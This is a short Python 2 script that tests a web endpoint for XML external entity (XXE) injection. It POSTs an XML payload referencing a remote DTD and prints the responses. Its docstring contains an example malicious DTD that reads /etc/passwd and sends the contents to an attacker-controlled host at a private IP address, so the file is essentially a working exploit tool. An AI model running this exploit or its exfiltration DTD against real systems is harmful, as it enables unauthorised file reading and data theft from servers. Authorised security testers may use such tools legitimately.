#!/usr/bin/env python
"""

Test a page for XXE injection.

Author: ANDRE LUIS ALBINO DE MORAES MARQUES
Date: 2018-02-13 - 11:37

Example for exploit.dtd to be served on remote host:
        <!ENTITY % p1 SYSTEM "file:///etc/passwd">
        <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001:/BLAH?%p1;'>">
        %p2;

"""

from requests import get,post
from argparse import ArgumentParser

def info(msg):
    return "\033[092m[+]\033[0m {0}".format(msg)

parser = ArgumentParser()
parser.add_argument("--remote", type=str, help="Remote resource to fetch with the initial XXE processing")
parser.add_argument("--target", type=str, help="Remote target to try to exploit XXE")

args = parser.parse_args()

# Exploitation options
remote_resource = args.remote

# XXE options
headers = [{"Content-Type":"text/xml"}, {"Content-Type":"application/xml"}]
xml = """<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo SYSTEM "{0}"><foo>&e1;</foo>""".format(remote_resource)

print info("XML Payload: {0}".format(xml))
print info("Testing '{0}' for XXE ...".format(args.target))
for header in headers:
    print info("Sending Content-Type: {0}".format(header["Content-Type"]))
    req = post(args.target,
        headers=header,
        data=xml)
    print req.text
